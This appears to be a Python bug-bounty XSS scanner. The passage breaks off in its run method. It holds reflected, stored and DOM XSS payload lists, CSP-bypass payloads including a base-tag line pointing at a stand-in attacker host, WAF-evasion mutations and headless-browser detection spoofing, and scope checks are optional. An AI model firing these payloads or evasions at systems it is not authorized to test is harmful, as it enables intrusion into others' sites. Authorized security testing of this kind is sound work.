#!/usr/bin/env python3
"""
XSS Framework — Comprehensive integrated XSS testing pipeline.

Phases:
  1. Parameter Discovery   — JS extraction, param fuzzing, WayBack URLs
  2. Screening             — Reflection check + sink proximity ranking
  3. Tiered Testing        — Reflected (A), Stored (B), DOM (C)
  4. Adaptive Bypass       — WAF-aware payload mutation
  5. Reporting             — JSON + Markdown output

Usage:
  python3 xss_framework.py --target "https://target.com/search?q=test" --program myprog
  python3 xss_framework.py --target "https://target.com" --mode dom --program myprog
  python3 xss_framework.py --target "https://target.com/search?q=test" --phase discover
  python3 xss_framework.py --target "https://target.com" --stored-url "https://target.com/comments"
"""

from __future__ import annotations

import argparse
import asyncio
import hashlib
import html
import json
import re
import subprocess
import sys
import time
from dataclasses import asdict, dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional
from urllib.parse import (
    parse_qs, urlencode, urljoin, urlparse, urlsplit, urlunsplit,
)
from uuid import uuid4

import httpx
from scope_validator import ScopeValidator
try:
    from rate_limiter import RateLimiter
except ImportError:
    RateLimiter = None

try:
    from bs4 import BeautifulSoup
    _HAS_BS4 = True
except ImportError:
    _HAS_BS4 = False

try:
    from playwright.sync_api import sync_playwright
    _HAS_PLAYWRIGHT = True
except ImportError:
    _HAS_PLAYWRIGHT = False

try:
    from xss_bypasses_advanced import get_all_bypass_payloads
    _HAS_BYPASSES = True
except ImportError:
    _HAS_BYPASSES = False

try:
    from browser_block_fix import BrowserBlockFix
    _HAS_BROWSER_BYPASS = True
except ImportError:
    _HAS_BROWSER_BYPASS = False


# ---------------------------------------------------------------------------
# BrowserBlockFix → httpx-compatible adapter
# ---------------------------------------------------------------------------

class _BBFResponse:
    """Wraps BrowserBlockFix dict response to look like httpx.Response."""

    def __init__(self, data: dict):
        self._data = data
        self.text = data.get("content", "")
        self.status_code = data.get("status", 0)

    def raise_for_status(self) -> None:
        if self.status_code >= 400:
            raise Exception(f"HTTP {self.status_code}")

    def json(self):
        return json.loads(self.text)


class _BBFSession:
    """Drop-in httpx.Client replacement backed by BrowserBlockFix.

    Passed as ``session`` to ParameterDiscovery, XSSScreener, etc. so
    they transparently use curl-first / browser-fallback without change.
    """

    def __init__(self, bbf: "BrowserBlockFix"):
        self._bbf = bbf

    def get(self, url: str, **kwargs) -> _BBFResponse:
        return _BBFResponse(self._bbf.get(url))

    def post(self, url: str, **kwargs) -> _BBFResponse:
        return _BBFResponse(
            self._bbf.post(url, data=kwargs.get("data"), json=kwargs.get("json"))
        )

    def close(self) -> None:
        self._bbf.done()


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

@dataclass
class DiscoveredParam:
    name: str
    source: str          # "url", "js", "wayback", "fuzz", "form"
    example_value: str = ""
    url: str = ""
    priority: int = 0    # higher = test first


@dataclass
class ScreenResult:
    param: str
    url: str
    reflected: bool
    context: str         # "html_body", "html_attr", "js_string", "js_template", "url_param", "comment", "none"
    location: str        # where in the response the marker appeared
    near_sink: bool
    priority: str        # "HIGH", "MED", "LOW"


@dataclass
class XSSFinding:
    type: str            # "reflected", "stored", "dom"
    url: str
    param: str
    payload: str
    context: str
    sink: str
    poc: str
    severity: str        # "P1", "P2", "P3"
    bypass_tier: str
    evidence: str
    confirmed: bool = False  # True if browser-verified execution


# ---------------------------------------------------------------------------
# Phase 1: Parameter Discovery
# ---------------------------------------------------------------------------

COMMON_PARAMS_WORDLIST = [
    "q", "s", "search", "query", "keyword", "term", "find", "text",
    "id", "uid", "user", "username", "name", "email",
    "url", "redirect", "return", "next", "back", "goto", "redir",
    "page", "p", "pg", "num", "offset", "limit", "start",
    "sort", "order", "dir", "asc", "desc",
    "filter", "type", "cat", "category", "tag", "topic",
    "lang", "locale", "currency",
    "ref", "referrer", "source", "from", "to",
    "token", "key", "api_key", "access_token",
    "callback", "jsonp", "format", "output",
    "action", "method", "op", "cmd", "exec",
    "file", "path", "dir", "folder", "include",
    "msg", "message", "content", "body", "data",
    "title", "subject", "description", "comment",
    "debug", "test", "dev", "preview",
]

JS_PARAM_PATTERN = re.compile(
    r"""(?:
        [?&]([a-zA-Z_][a-zA-Z0-9_\-]*)=   # URL query string
        |
        ['"]([a-zA-Z_][a-zA-Z0-9_\-]{1,40})['"]\s*:   # JSON key or object
        |
        (?:getParameter|get|params)\(['"]([a-zA-Z_][a-zA-Z0-9_\-]{1,40})['"]\)  # API calls
        |
        URLSearchParams[^;]*\.get\(['"]([a-zA-Z_][a-zA-Z0-9_\-]{1,40})['"]\)
    )""",
    re.VERBOSE,
)

WAYBACK_API = "https://web.archive.org/cdx/search/cdx"


class ParameterDiscovery:
    """Phase 1: Discover all injectable parameters for a target."""

    def __init__(self, session: httpx.Client, verbose: bool = False):
        self.session = session
        self.verbose = verbose

    def run(self, target: str) -> list[DiscoveredParam]:
        params: list[DiscoveredParam] = []

        # Pull params already in the URL
        params.extend(self._from_url(target))

        # Extract from JS files
        params.extend(self._extract_from_js(target))

        # WayBack Machine historical URLs
        params.extend(self._fetch_wayback(target))

        # Fuzz for hidden params
        params.extend(self._fuzz_params(target))

        return self._dedupe_and_rank(params)

    def _from_url(self, target: str) -> list[DiscoveredParam]:
        split = urlsplit(target)
        parsed = parse_qs(split.query, keep_blank_values=True)
        result = []
        for name, values in parsed.items():
            result.append(DiscoveredParam(
                name=name,
                source="url",
                example_value=values[0] if values else "",
                url=target,
                priority=10,
            ))
        return result

    def _extract_from_js(self, target: str) -> list[DiscoveredParam]:
        found: list[DiscoveredParam] = []
        try:
            resp = self.session.get(target, timeout=15)
            resp.raise_for_status()
        except Exception:
            return found

        script_urls = self._get_script_urls(resp.text, target)
        js_contents = [resp.text]  # Also scan inline scripts in HTML

        for url in script_urls[:15]:
            try:
                js_resp = self.session.get(url, timeout=10)
                js_resp.raise_for_status()
                js_contents.append(js_resp.text)
            except Exception:
                continue

        for content in js_contents:
            for match in JS_PARAM_PATTERN.finditer(content):
                name = next((g for g in match.groups() if g), None)
                if name and 1 < len(name) < 40:
                    found.append(DiscoveredParam(
                        name=name,
                        source="js",
                        url=target,
                        priority=6,
                    ))

        return found

    def _fetch_wayback(self, target: str) -> list[DiscoveredParam]:
        found: list[DiscoveredParam] = []
        parsed = urlparse(target)
        domain = parsed.netloc
        if not domain:
            return found

        try:
            resp = self.session.get(
                WAYBACK_API,
                params={
                    "url": f"{domain}/*",
                    "output": "json",
                    "fl": "original",
                    "collapse": "urlkey",
                    "limit": "500",
                    "filter": "statuscode:200",
                },
                timeout=20,
            )
            resp.raise_for_status()
            data = resp.json()
        except Exception:
            return found

        for row in data[1:]:  # Skip header
            url = row[0] if isinstance(row, list) else row
            split = urlsplit(url)
            for name, values in parse_qs(split.query).items():
                found.append(DiscoveredParam(
                    name=name,
                    source="wayback",
                    example_value=values[0] if values else "",
                    url=url,
                    priority=7,
                ))

        if self.verbose:
            print(f"  [wayback] found {len(found)} params from archive")
        return found

    def _fuzz_params(self, target: str) -> list[DiscoveredParam]:
        """Fuzz for hidden params using a wordlist and reflection check."""
        found: list[DiscoveredParam] = []
        marker = f"FUZZ{uuid4().hex[:8]}"
        base = _strip_query(target)

        for word in COMMON_PARAMS_WORDLIST:
            try:
                url = f"{base}?{word}={marker}"
                resp = self.session.get(url, timeout=8)
                if marker in resp.text:
                    found.append(DiscoveredParam(
                        name=word,
                        source="fuzz",
                        example_value=marker,
                        url=url,
                        priority=8,
                    ))
                    if self.verbose:
                        print(f"  [fuzz] reflected param: {word}")
            except Exception:
                continue

        return found

    def _get_script_urls(self, html_text: str, base_url: str) -> list[str]:
        if _HAS_BS4:
            soup = BeautifulSoup(html_text, "html.parser")
            return [
                urljoin(base_url, tag["src"])
                for tag in soup.find_all("script", src=True)
            ]
        return [
            urljoin(base_url, m.group(1))
            for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', html_text, re.I)
        ]

    def _dedupe_and_rank(self, params: list[DiscoveredParam]) -> list[DiscoveredParam]:
        seen: dict[str, DiscoveredParam] = {}
        for p in params:
            if p.name not in seen or p.priority > seen[p.name].priority:
                seen[p.name] = p
        return sorted(seen.values(), key=lambda x: x.priority, reverse=True)


# ---------------------------------------------------------------------------
# Phase 2: Screening
# ---------------------------------------------------------------------------

CONTEXT_PATTERNS = {
    "html_body": [
        re.compile(r"<[^>]*MARKER[^>]*>", re.I),
        re.compile(r"MARKER\s*</", re.I),
    ],
    "html_attr": [
        re.compile(r'(?:value|placeholder|title|alt|href|src|action)=["\'][^"\']*MARKER'),
        re.compile(r"MARKER[^\"'>]*[\"']"),
    ],
    "js_string": [
        re.compile(r"""['"]\s*[+,]\s*MARKER|MARKER\s*[+,]\s*['"]"""),
        re.compile(r"""var\s+\w+\s*=\s*['"]\s*MARKER"""),
        re.compile(r"""MARKER['"]\s*[;,)]"""),
    ],
    "js_template": [
        re.compile(r"`[^`]*MARKER[^`]*`"),
        re.compile(r"\$\{[^}]*MARKER[^}]*\}"),
    ],
    "url_param": [
        re.compile(r"(?:href|src|action|redirect)[^\"'>]*MARKER"),
    ],
    "comment": [
        re.compile(r"<!--[^>]*MARKER"),
    ],
}

DANGEROUS_SINKS = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "eval(", "Function(", "setTimeout(", "setInterval(",
    "location.href", "location.assign", "location.replace",
    "dangerouslySetInnerHTML", "ng-bind-html", "v-html",
]


class XSSScreener:
    """Phase 2: Fast screening to find parameters worth testing."""

    def __init__(self, session: httpx.Client, rate_limit: float = 1.0):
        self.session = session
        self._delay = 1.0 / max(rate_limit, 0.1)

    def screen(self, target: str, params: list[DiscoveredParam]) -> list[ScreenResult]:
        candidates: list[ScreenResult] = []
        baseline_html = self._fetch(target)

        for param in params:
            marker = f"XSS{uuid4().hex[:10].upper()}"
            result = self._test_reflection(target, param.name, marker, baseline_html)
            if result:
                candidates.append(result)
            time.sleep(self._delay)

        return sorted(candidates, key=lambda r: (r.priority == "HIGH", r.near_sink), reverse=True)

    def _test_reflection(
        self,
        target: str,
        param: str,
        marker: str,
        baseline_html: str,
    ) -> Optional[ScreenResult]:
        url = _inject_param(target, param, marker)
        try:
            resp = self.session.get(url, timeout=12)
        except Exception:
            return None

        body = resp.text
        if marker not in body and html.unescape(body).find(marker) == -1:
            return None

        context = self._detect_context(body, marker)
        near = self._near_sink(body)
        priority = "HIGH" if (near or context in ("js_string", "js_template", "html_attr")) else "MED"
        location = self._find_location(body, marker)

        return ScreenResult(
            param=param,
            url=url,
            reflected=True,
            context=context,
            location=location,
            near_sink=near,
            priority=priority,
        )

    def _detect_context(self, body: str, marker: str) -> str:
        for ctx_name, patterns in CONTEXT_PATTERNS.items():
            for pattern in patterns:
                if pattern.search(body.replace("MARKER", marker)):
                    return ctx_name
        # Fallback: just find where it appears
        idx = body.find(marker)
        if idx == -1:
            return "none"
        snippet = body[max(0, idx - 30):idx + len(marker) + 30]
        if "<script" in snippet.lower() or "function" in snippet.lower():
            return "js_string"
        if "<!--" in snippet:
            return "comment"
        return "html_body"

    def _near_sink(self, body: str) -> bool:
        return any(sink.lower() in body.lower() for sink in DANGEROUS_SINKS)

    def _find_location(self, body: str, marker: str) -> str:
        idx = body.find(marker)
        if idx == -1:
            return ""
        return body[max(0, idx - 60):idx + len(marker) + 60].replace("\n", " ").strip()

    def _fetch(self, url: str) -> str:
        try:
            return self.session.get(url, timeout=12).text
        except Exception:
            return ""


# ---------------------------------------------------------------------------
# Phase 3A: Reflected XSS Tester
# ---------------------------------------------------------------------------

REFLECTED_PAYLOADS: dict[str, list[str]] = {
    "standard": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
    ],
    "encoding": [
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        "<svg onload=alert&#40;1&#41;>",
        "%3Cimg%20src=x%20onerror=alert%281%29%3E",
        "<img src=x onerror=\u0061lert(1)>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
    ],
    "alternative_tags": [
        "<math><mi>x</mi><mglyph><style></style><img src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<svg><animate onbegin=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<object data=javascript:alert(1)>",
    ],
    "attribute_break": [
        '" onmouseover="alert(1)" x="',
        "' onfocus='alert(1)' x='",
        '" autofocus onfocus="alert(1)"',
        "javascript:alert(1)",
        '" style="animation-name:slidein" onanimationstart="alert(1)" x="',
    ],
    "js_break": [
        "';alert(1)//",
        '";alert(1)//',
        "`${alert(1)}`",
        "</script><script>alert(1)</script>",
        "\\';alert(1)//",
        "'-alert(1)-'",
        '"-alert(1)-"',
    ],
    "hpp": [
        "alert(1)&x=ignored",
        "<img src=x&q=onerror=alert(1)>",
    ],
    "mutation": [
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>',
        "<svg><style><img src=x onerror=alert(1)>",
        "<math><mtext></mtext><mglyph><style></math><img src=x onerror=alert(1)>",
        "<table><td><form><input></table><img src=x onerror=alert(1)>",
    ],
    "no_parens": [
        "<img src=x onerror=alert`1`>",
        "<svg onload=alert`1`>",
        "<img src=x onerror=alert`${document.domain}`>",
    ],
    "template_literal": [
        "${alert(1)}",
        "{{constructor.constructor('alert(1)')()}}",
        "#{alert(1)}",
    ],
    "csp_bypass": [
        "<script src=//cdn.jsdelivr.net/npm/angular></script><div ng-app ng-csp><div ng-include='\"data:,alert(1)\"'></div></div>",
        "<link rel=import href='data:text/html,<script>alert(1)</script>'>",
        "<base href=//evil.com/>",
    ],
}


class ReflectedTester:
    """Phase 3A: Test for Reflected XSS."""

    TIERS = ["standard", "encoding", "alternative_tags", "attribute_break",
             "js_break", "hpp", "mutation", "no_parens", "template_literal", "csp_bypass"]

    def __init__(self, session: httpx.Client, rate_limit: float = 1.0):
        self.session = session
        self._delay = 1.0 / max(rate_limit, 0.1)

    def test(self, target: str, screen_result: ScreenResult) -> list[XSSFinding]:
        findings: list[XSSFinding] = []
        consecutive_blocks = 0

        for tier in self.TIERS:
            if consecutive_blocks >= 3:
                break  # WAF is blocking aggressively, skip remaining tiers

            for payload in REFLECTED_PAYLOADS.get(tier, []):
                result = self._send(target, screen_result.param, payload)
                time.sleep(self._delay)

                if result["executed"] or result["reflected_intact"]:
                    findings.append(XSSFinding(
                        type="reflected",
                        url=result["url"],
                        param=screen_result.param,
                        payload=payload,
                        context=screen_result.context,
                        sink="reflection",
                        poc=result["url"],
                        severity=self._severity(tier, screen_result),
                        bypass_tier=tier,
                        evidence=result["evidence"],
                        confirmed=result["executed"],
                    ))
                    return findings  # Found one, stop

                if result["blocked"]:
                    consecutive_blocks += 1
                else:
                    consecutive_blocks = 0

        return findings

    def _send(self, target: str, param: str, payload: str) -> dict:
        url = _inject_param(target, param, payload)
        try:
            resp = self.session.get(url, timeout=12)
        except Exception as exc:
            return _empty_result(url, str(exc))

        body = resp.text
        blocked = _is_blocked(resp.status_code, body)
        reflected_intact = (payload in body or html.unescape(payload) in html.unescape(body))
        executed = reflected_intact and _looks_executable(payload, body)

        evidence = _snippet(body, payload)
        return {
            "url": url,
            "blocked": blocked,
            "reflected_intact": reflected_intact,
            "executed": executed,
            "evidence": evidence,
            "status": resp.status_code,
        }

    def _severity(self, tier: str, screen: ScreenResult) -> str:
        if screen.context in ("js_string", "js_template"):
            return "P1"
        if tier in ("standard", "alternative_tags"):
            return "P2"
        return "P2"

    def get_bypass_payloads(self, base_payload: str = "alert(1)") -> dict[str, list[str]]:
        """Get advanced bypass payloads organized by category.
        
        Returns bypass payloads from xss_bypasses_advanced module.
        """
        if not _HAS_BYPASSES:
            return {}
        
        try:
            return get_all_bypass_payloads(f"<{base_payload}>")
        except Exception:
            return {}


# ---------------------------------------------------------------------------
# Phase 3B: Stored XSS Tester
# ---------------------------------------------------------------------------

STORED_PAYLOADS = [
    "<script>alert('STORED_{TOKEN}')</script>",
    "<img src=x onerror=alert('STORED_{TOKEN}')>",
    "<svg onload=alert('STORED_{TOKEN}')>",
    "<details open ontoggle=alert('STORED_{TOKEN}')>",
    '"><img src=x onerror=alert(\'STORED_{TOKEN}\')>',
    "';alert('STORED_{TOKEN}')//",
]


class StoredTester:
    """Phase 3B: Two-phase stored XSS test — submit then find render location."""

    def __init__(self, session: httpx.Client, rate_limit: float = 1.0):
        self.session = session
        self._delay = 1.0 / max(rate_limit, 0.1)

    def test(
        self,
        submit_url: str,
        render_urls: list[str],
        param: str,
    ) -> list[XSSFinding]:
        findings: list[XSSFinding] = []
        token = uuid4().hex[:8].upper()

        # Phase 1: Confirm storage
        if not self._submit(submit_url, param, f"STOREDTEST_{token}"):
            return findings

        time.sleep(2)  # Wait for persistence

        # Phase 2: Find render locations
        render_locations = self._find_render(render_urls, f"STOREDTEST_{token}")
        if not render_locations:
            return findings

        # Phase 3: Escalate with real payloads
        for payload_tmpl in STORED_PAYLOADS:
            payload = payload_tmpl.replace("{TOKEN}", token)
            if self._submit(submit_url, param, payload):
                time.sleep(1)
                for loc in render_locations:
                    result = self._check_execution(loc, payload, token)
                    if result["reflected"] or result["executed"]:
                        findings.append(XSSFinding(
                            type="stored",
                            url=loc,
                            param=param,
                            payload=payload,
                            context="stored",
                            sink="innerHTML / render",
                            poc=loc,
                            severity="P1",
                            bypass_tier="stored",
                            evidence=result["evidence"],
                            confirmed=result["executed"],
                        ))
                        return findings
            time.sleep(self._delay)

        return findings

    def _submit(self, url: str, param: str, value: str) -> bool:
        try:
            test_url = _inject_param(url, param, value)
            resp = self.session.get(test_url, timeout=12)
            return resp.status_code < 500
        except Exception:
            return False

    def _find_render(self, render_urls: list[str], token: str) -> list[str]:
        found = []
        for url in render_urls:
            try:
                resp = self.session.get(url, timeout=12)
                if token in resp.text:
                    found.append(url)
            except Exception:
                continue
        return found

    def _check_execution(self, url: str, payload: str, token: str) -> dict:
        try:
            resp = self.session.get(url, timeout=12)
            body = resp.text
            reflected = payload in body or f"STORED_{token}" in body
            executed = reflected and _looks_executable(payload, body)
            return {"reflected": reflected, "executed": executed, "evidence": _snippet(body, token)}
        except Exception:
            return {"reflected": False, "executed": False, "evidence": ""}


# ---------------------------------------------------------------------------
# Phase 3C: DOM XSS Analyzer
# ---------------------------------------------------------------------------

DOM_SOURCES = [
    r"location\.href",
    r"location\.hash",
    r"location\.search",
    r"location\.pathname",
    r"document\.URL",
    r"document\.documentURI",
    r"document\.cookie",
    r"document\.referrer",
    r"window\.name",
    r"history\.pushState",
    r"URLSearchParams",
    r"\.getAttribute\(",
    r"postMessage",
]

DOM_SINKS = [
    r"innerHTML\s*=",
    r"outerHTML\s*=",
    r"document\.write\(",
    r"document\.writeln\(",
    r"\beval\(",
    r"new\s+Function\(",
    r"setTimeout\(\s*[\"'`]",
    r"setInterval\(\s*[\"'`]",
    r"location\s*=\s*",
    r"location\.href\s*=",
    r"location\.assign\(",
    r"location\.replace\(",
    r"\.src\s*=",
    r"\.href\s*=",
    r"insertAdjacentHTML\(",
    r"\.setAttribute\(\s*[\"']on",
    r"jQuery\s*\(\s*[\"']",
    r"\$\s*\(\s*[\"']",
]

DOM_PAYLOADS_BY_SINK = {
    "innerHTML": "#<img src=x onerror=alert(document.domain)>",
    "document.write": "#<script>alert(document.domain)</script>",
    "eval": "#alert(document.domain)",
    "location": "javascript:alert(document.domain)",
    "src": "javascript:alert(document.domain)",
    "href": "javascript:alert(document.domain)",
    "default": "#<img src=x onerror=alert(document.domain)>",
}


class DOMTester:
    """Phase 3C: Analyze JS source-to-sink chains and test DOM XSS."""

    def __init__(self, session: httpx.Client):
        self.session = session
        self._source_re = [re.compile(p) for p in DOM_SOURCES]
        self._sink_re = [re.compile(p) for p in DOM_SINKS]

    def analyze(self, target: str) -> list[XSSFinding]:
        findings: list[XSSFinding] = []

        try:
            resp = self.session.get(target, timeout=15)
            resp.raise_for_status()
        except Exception:
            return findings

        js_files = self._collect_js(resp.text, target)
        js_contents: list[tuple[str, str]] = [("inline", resp.text)]

        for url in js_files[:20]:
            try:
                js_resp = self.session.get(url, timeout=10)
                js_resp.raise_for_status()
                js_contents.append((url, js_resp.text))
            except Exception:
                continue

        for js_url, content in js_contents:
            chains = self._find_chains(content)
            for source, sink in chains:
                payload = self._payload_for_sink(sink)
                findings.append(XSSFinding(
                    type="dom",
                    url=target,
                    param=source,
                    payload=payload,
                    context="dom_source_to_sink",
                    sink=sink,
                    poc=f"{target}{payload}",
                    severity=self._dom_severity(sink),
                    bypass_tier="dom_analysis",
                    evidence=f"Source: {source} → Sink: {sink} in {js_url}",
                ))

        return self._dedupe(findings)

    def _find_chains(self, js: str) -> list[tuple[str, str]]:
        """Find all (source, sink) pairs present in the same JS file."""
        chains: list[tuple[str, str]] = []
        found_sources = [
            DOM_SOURCES[i]
            for i, pattern in enumerate(self._source_re)
            if pattern.search(js)
        ]
        found_sinks = [
            DOM_SINKS[i]
            for i, pattern in enumerate(self._sink_re)
            if pattern.search(js)
        ]
        for src in found_sources:
            for sink in found_sinks:
                chains.append((src, sink))
        return chains

    def _collect_js(self, html_text: str, base_url: str) -> list[str]:
        if _HAS_BS4:
            soup = BeautifulSoup(html_text, "html.parser")
            return [urljoin(base_url, tag["src"]) for tag in soup.find_all("script", src=True)]
        return [
            urljoin(base_url, m.group(1))
            for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', html_text, re.I)
        ]

    def _payload_for_sink(self, sink: str) -> str:
        for key, payload in DOM_PAYLOADS_BY_SINK.items():
            if key.lower() in sink.lower():
                return payload
        return DOM_PAYLOADS_BY_SINK["default"]

    def _dom_severity(self, sink: str) -> str:
        high_sinks = {"eval", "function", "innerhtml", "document.write"}
        return "P1" if any(s in sink.lower() for s in high_sinks) else "P2"

    def _dedupe(self, findings: list[XSSFinding]) -> list[XSSFinding]:
        seen: set[tuple[str, str]] = set()
        unique = []
        for f in findings:
            key = (f.param, f.sink)
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique


# ---------------------------------------------------------------------------
# Phase 4: Adaptive Bypass Engine
# ---------------------------------------------------------------------------

class BypassEngine:
    """Phase 4: Adaptive payload mutation based on WAF response analysis."""

    BLOCK_SIGNATURES = {
        "blocked_tag": [
            re.compile(r"<script", re.I),
            re.compile(r"malicious", re.I),
            re.compile(r"not allowed", re.I),
        ],
        "blocked_attribute": [
            re.compile(r"onerror|onload|onclick|onfocus", re.I),
            re.compile(r"event handler", re.I),
        ],
        "blocked_quote": [
            re.compile(r"quote.*not allowed", re.I),
        ],
        "blocked_parens": [
            re.compile(r"alert\(|confirm\(|prompt\(", re.I),
        ],
        "blocked_keyword": [
            re.compile(r"alert|script|javascript", re.I),
        ],
        "waf_block": [
            re.compile(r"cloudflare|sucuri|incapsula|modsecurity|akamai", re.I),
            re.compile(r"access denied|forbidden|blocked", re.I),
            re.compile(r"reference #\d", re.I),
        ],
    }

    def detect_block_type(self, response_text: str, status_code: int) -> str:
        if status_code in (403, 406, 429, 503):
            return "waf_block"
        for block_type, patterns in self.BLOCK_SIGNATURES.items():
            for pattern in patterns:
                if pattern.search(response_text):
                    return block_type
        return "NO_BLOCK"

    def adapt(self, payload: str, block_type: str) -> list[str]:
        """Return a list of bypass variants for the given block type."""
        variants: list[str] = []

        if block_type == "blocked_tag":
            variants.extend(self._alternative_tag_variants(payload))
        elif block_type == "blocked_attribute":
            variants.extend(self._alternative_attribute_variants(payload))
        elif block_type == "blocked_quote":
            variants.extend(self._no_quote_variants(payload))
        elif block_type == "blocked_parens":
            variants.extend(self._no_parens_variants(payload))
        elif block_type == "blocked_keyword":
            variants.extend(self._obfuscation_variants(payload))
        elif block_type == "waf_block":
            variants.extend(self._waf_evasion_variants(payload))

        return variants

    def _alternative_tag_variants(self, payload: str) -> list[str]:
        return [
            re.sub(r"<script[^>]*>.*?</script>", "<svg onload=alert(1)>", payload, flags=re.I | re.S),
            re.sub(r"<script[^>]*>.*?</script>", "<img src=x onerror=alert(1)>", payload, flags=re.I | re.S),
            re.sub(r"<script[^>]*>.*?</script>", "<details open ontoggle=alert(1)>", payload, flags=re.I | re.S),
            "<svg><animate onbegin=alert(1)>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        ]

    def _alternative_attribute_variants(self, payload: str) -> list[str]:
        return [
            payload.replace("onerror=", "onload="),
            payload.replace("onerror=", "ontoggle="),
            payload.replace("onerror=", "onanimationstart="),
            payload.replace("onerror=", "onpointerenter="),
            re.sub(r"on\w+=", "onpointerover=", payload),
        ]

    def _no_quote_variants(self, payload: str) -> list[str]:
        return [
            payload.replace('"', "`").replace("'", "`"),
            payload.replace("'", "").replace('"', ""),
            re.sub(r"[\"']([^\"']+)[\"']", r"/\1/", payload),
        ]

    def _no_parens_variants(self, payload: str) -> list[str]:
        return [
            re.sub(r"alert\([^)]*\)", "alert`1`", payload),
            re.sub(r"alert\([^)]*\)", "alert`${document.domain}`", payload),
            re.sub(r"confirm\([^)]*\)", "confirm`1`", payload),
            payload.replace("alert(1)", "eval('ale'+'rt(1)')"),
            payload.replace("alert(1)", "window['alert'](1)"),
        ]

    def _obfuscation_variants(self, payload: str) -> list[str]:
        obfuscated_alert = "&#97;&#108;&#101;&#114;&#116;"
        return [
            payload.replace("alert", obfuscated_alert),
            payload.replace("alert", "\\u0061lert"),
            payload.replace("alert", "al\u200Dert"),   # Zero-width joiner
            payload.replace("script", "scr\tipt"),     # Tab in tag name
            payload.replace("<script>", "<scr\x00ipt>"),
            payload.lower().replace("script", "SCRIPT"),  # Case variation
        ]

    def _waf_evasion_variants(self, payload: str) -> list[str]:
        variants = [
            payload.replace("<", "\x3c"),
            payload.replace("<", "%3c"),
            payload + "/**/",
            "\n" + payload,
            payload.replace(" ", "\t"),
            payload.replace("=", "\x3d"),
        ]
        
        # Add advanced bypass payloads from xss_bypasses_advanced module
        if _HAS_BYPASSES:
            try:
                bypass_payloads = get_all_bypass_payloads(payload)
                # Flatten and add interesting ones
                for category, payloads in bypass_payloads.items():
                    if category in ('hpp', 'mutation_xss', 'encoding', 'waf_specific'):
                        variants.extend(payloads[:5])  # Limit to first 5 per category
            except Exception:
                pass
        
        return variants


# ---------------------------------------------------------------------------
# Phase 5: Browser Verification (optional, requires Playwright)
# ---------------------------------------------------------------------------

def verify_with_browser(finding: XSSFinding) -> bool:
    """Use Playwright to confirm actual JS execution."""
    if not _HAS_PLAYWRIGHT:
        return False

    executed = False
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
            context = browser.new_context(ignore_https_errors=True)
            page = context.new_page()
            page.add_init_script(
                "Object.defineProperty(navigator, 'webdriver', {get: () => undefined});"
            )

            dialogs: list[str] = []
            page.on("dialog", lambda d: (dialogs.append(d.message), d.dismiss()))

            page.goto(finding.poc, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(1500)

            executed = bool(dialogs)
            browser.close()
    except Exception:
        pass

    return executed


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------

class XSSFramework:
    """Integrated XSS testing pipeline orchestrator."""

    def __init__(
        self,
        target: str,
        program: str = "adhoc",
        rate_limit: float = 2.0,
        mode: str = "full",           # "full" | "reflected" | "dom" | "stored"
        stored_urls: list[str] | None = None,
        browser_verify: bool = False,
        verbose: bool = False,
        skip_scope: bool = False,
        use_browser_bypass: bool = False,  # auto-bypass WAF via BrowserBlockFix
    ):
        self.target = target if target.startswith(("http://", "https://")) else f"https://{target}"
        self.program = program
        self.rate_limit = rate_limit
        self.mode = mode
        self.stored_urls = stored_urls or []
        self.browser_verify = browser_verify
        self.verbose = verbose
        self.skip_scope = skip_scope
        self.use_browser_bypass = use_browser_bypass

        if use_browser_bypass and _HAS_BROWSER_BYPASS:
            self._bbf = BrowserBlockFix(self.target, program)
            self.session = _BBFSession(self._bbf)
            print("[+] Browser bypass enabled (BrowserBlockFix): curl → stealth browser on WAF block")
        else:
            self._bbf = None
            self.session = httpx.Client(
                timeout=30,
                follow_redirects=True,
                headers={
                    "User-Agent": (
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/120.0.0.0 Safari/537.36"
                    ),
                    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
                    "Accept-Language": "en-GB,en;q=0.9",
                },
            )

        self.discovery = ParameterDiscovery(self.session, verbose)
        self.screener = XSSScreener(self.session, rate_limit)
        self.reflected_tester = ReflectedTester(self.session, rate_limit)
        self.stored_tester = StoredTester(self.session, rate_limit)
        self.dom_tester = DOMTester(self.session)
        self.bypass_engine = BypassEngine()

        self.findings: list[XSSFinding] = []

        # Load scope if program specified
        if not skip_scope and program and program != "adhoc":
            self.scope = ScopeValidator(program)
            print(f"[+] Loaded scope for program: {program}")
        else:
            self.scope = None

        # Setup rate limiter
        self.limiter = RateLimiter(requests_per_second=5) if RateLimiter else None

    def validate_target(self, url: str) -> bool:
        """Check if URL is in scope."""
        if not self.scope:
            return True  # No scope, allow all
        return self.scope.is_in_scope(url)

    def validate_or_skip(self, url: str) -> bool:
        """Validate or log and skip."""
        if self.validate_target(url):
            return True
        print(f"    [SKIP] Out of scope: {url}")
        return False

    def run(self) -> list[XSSFinding]:
        print(f"[*] XSS Framework — Target: {self.target}")
        print(f"[*] Mode: {self.mode} | Rate: {self.rate_limit}/s | Program: {self.program}")

        # Phase 1: Parameter discovery
        if self.mode in ("full", "reflected", "stored"):
            print("\n[Phase 1] Discovering parameters...")
